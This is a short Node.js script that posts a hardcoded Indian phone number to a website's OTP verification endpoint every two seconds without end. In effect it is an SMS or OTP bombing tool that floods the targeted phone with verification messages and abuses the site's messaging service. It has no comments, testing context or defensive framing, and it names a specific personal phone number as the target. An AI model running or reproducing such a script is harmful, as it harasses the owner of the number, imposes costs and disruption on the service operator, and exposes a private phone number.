const got = require('got');

const getOTP = async () => {
  const options = {
    url: 'https://rowdyclub.in/api/verify/phone',
    headers: {
      accept: '*/*',
      'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,te;q=0.6',
      'content-type': 'application/json',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin'
    },
    referrer: 'https://rowdyclub.in/login',
    referrerPolicy: 'strict-origin-when-cross-origin',
    body: '{"phone":"+919383668709"}',
    method: 'POST',
    mode: 'cors'
  };
  const response = await got(options);
  console.log(response.body);
};

(function () {
  setInterval(async () => {
    await getOTP();
  }, 2000);
})();
